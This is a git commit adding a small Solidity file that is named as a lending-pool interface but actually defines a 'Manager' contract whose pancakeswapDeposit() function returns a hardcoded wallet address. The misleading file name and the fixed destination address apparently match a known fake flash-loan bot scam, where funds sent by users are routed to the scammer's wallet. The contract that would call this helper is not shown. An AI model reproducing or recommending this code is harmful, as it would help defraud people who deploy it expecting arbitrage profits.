0679166d5e0dc9bbcfa21cc04881d82faa4c0680
FlashLoan-BSC-BR <93739499+FlashLoan-BSC-BR@users.noreply.github.com>
2021-11-04 21:04:19 +0000

    Create ILendingPoolContractAddress.sol

---
+++ contracts/interfaces/ILendingPoolContractAddress.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0x9ee568e2d588Af53A7165B8419852Ee004bcfE0D;
+	}
+	
+}
